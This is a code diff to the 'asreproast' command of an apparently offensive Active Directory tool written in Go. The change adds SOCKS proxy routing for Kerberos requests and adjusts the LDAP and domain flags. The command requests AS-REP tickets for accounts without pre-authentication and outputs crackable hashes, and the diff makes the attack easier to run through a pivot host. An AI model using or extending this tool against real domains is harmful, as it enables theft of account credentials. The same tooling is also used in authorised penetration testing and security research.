@@ -21,6 +21,7 @@ func init() {
 	var format string
 	var user string
 	var outputFile string
+	var socks string
 
 	var asRepRoastCmd = &cobra.Command{
 		Use:   "asreproast",
@@ -44,6 +45,11 @@ func init() {
 		RunE: func(cmd *cobra.Command, args []string) error {
 			printDomainInformation(domain, dcIp)
 
+			dialer, err := getKdcDialer(socks)
+			if err != nil {
+				return fmt.Errorf("Cannot create SOCKS client: %s", err)
+			}
+
 			encType := getETypeFromFlagValue(enctype)
 			// String containing hashes on each line
 			hashes := ""
@@ -59,7 +65,7 @@ func init() {
 				}
 
 				// TODO : support LDAPS
-				if err := ldapClient.Connect(dcIp, 389); err != nil {
+				if err := ldapClient.Connect(dcIp, 389, false); err != nil {
 					return err
 				}
 				defer ldapClient.Close()
@@ -82,7 +88,7 @@ func init() {
 			for _, target := range targets {
 				fmt.Printf("[*] Ask AS-Rep for user %s without pre-authentication\n", target)
 
-				tgt, err := krb5.AskTGT(domain, target, "", nil, encType, dcIp, true, false)
+				tgt, err := krb5.AskTGT(dialer, domain, target, "", nil, encType, dcIp, true, false)
 				if err != nil {
 					fmt.Printf("[!] An error occured: %s\n", err)
 					continue
@@ -119,10 +125,12 @@ func init() {
 		},
 	}
 
-	commandAddKerberosDomainFlags(asRepRoastCmd, &domain, &dcIp)
+	commandAddKerberosDomainFlags(asRepRoastCmd, &dcIp, &socks)
 	commandAddLDAPFlags(asRepRoastCmd, &ldapUser, &ldapPassword, &ldapSizeLimit)
 	commandAddKerberosETypeFlagWithDefaultValue(asRepRoastCmd, &enctype, "rc4")
 	commandAddFormatFlag(asRepRoastCmd, &format)
+	asRepRoastCmd.Flags().StringVarP(&domain, "domain", "d", "", "Domain to target")
+	cobra.MarkFlagRequired(asRepRoastCmd.Flags(), "domain")
 	asRepRoastCmd.Flags().StringVarP(&user, "user", "", "", "User to roast")
 	asRepRoastCmd.Flags().StringVarP(&outputFile, "output", "o", "", "Output the hashes to a file")
 
